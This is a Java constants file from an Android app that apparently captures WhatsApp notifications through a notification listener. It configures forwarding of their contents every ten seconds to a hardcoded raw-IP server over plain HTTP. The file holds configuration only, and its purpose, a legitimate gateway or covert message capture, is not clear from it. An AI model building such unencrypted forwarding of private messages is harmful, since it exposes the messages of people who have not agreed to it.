package com.noscale.bos.utils;

import android.Manifest;
import android.os.Environment;
import com.noscale.bos.controllers.BaseController;
import java.util.HashMap;

/**
 * Created by kurniawanrizzki on 20/05/18.
 */

public class AppGlobal {

    public static boolean isScheduleRunning;
    public static final HashMap<String, BaseController> controllerMap = new HashMap<>();

    public static final String FILE_LOG_DIR = Environment.getExternalStorageDirectory()+"/bos";
    public static final String FILE_LOG_NAME = "bos_log.txt";
    public static final boolean IS_FILE_LOGGED_VERSION = false;

    public static final String DEFAULT_USED_BASE_URL = "http://185.201.8.192";
    public static final int DEFAULT_USED_PORT = 3331;
    public static final int DEFAULT_USED_LANGUAGE = Language.EN;
    public static final String DEFAULT_USED_IMEI = "";
    public static final boolean DEFAULT_IS_SERVICE_ENABLE = true;
    public static final long DEFAULT_USED_INTERVAL_MESSAGE_FORWARDED = 10000;
    public static final int DEFAULT_USED_QUERY_LIMIT_PER_INTERVAL_MESSAGE_FORWARDED = 10;

    public static final String ENABLE_NOTIFICATION_LISTENERS_TAG = "enabled_notification_listeners";
    public static final String ENABLE_NOTIFICATION_LISTENERS_ACTION_SETTING_TAG = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS";
    public static final String[] ALLOWED_FORWARDING_APPLICATION_PACKAGE = {
            "com.whatsapp"
    };
    public static interface Language {
        int ID = 0;
        int EN = 1;
    }

    public static final String[] FILE_PERMISSION = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
}
